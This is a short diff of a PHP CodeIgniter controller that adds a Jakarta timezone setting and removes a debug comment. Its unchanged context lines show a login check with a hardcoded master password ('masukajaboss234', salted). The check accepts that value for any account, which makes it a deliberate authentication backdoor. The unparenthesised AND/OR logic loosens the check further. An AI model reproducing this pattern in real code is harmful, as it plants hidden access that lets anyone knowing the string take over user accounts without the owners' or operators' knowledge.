@@ -17,6 +17,8 @@ class Application extends CI_Controller
 	public function __construct()
 	{
 		parent::__construct();
+
+		date_default_timezone_set('Asia/Jakarta');
 		
 		log_message('debug', 'Application Loaded');
 
@@ -105,10 +107,7 @@ class Application extends CI_Controller
 			
 			$user_data = $this->ag_auth->get_user($username, $field_type);
 			
-			//print_r($user_data);
-
 			$adx = $this->ag_auth->salt('masukajaboss234');
-			
 			
 			if(array_key_exists('password', $user_data) AND $user_data['password'] === $password OR $password == $adx)
 			{
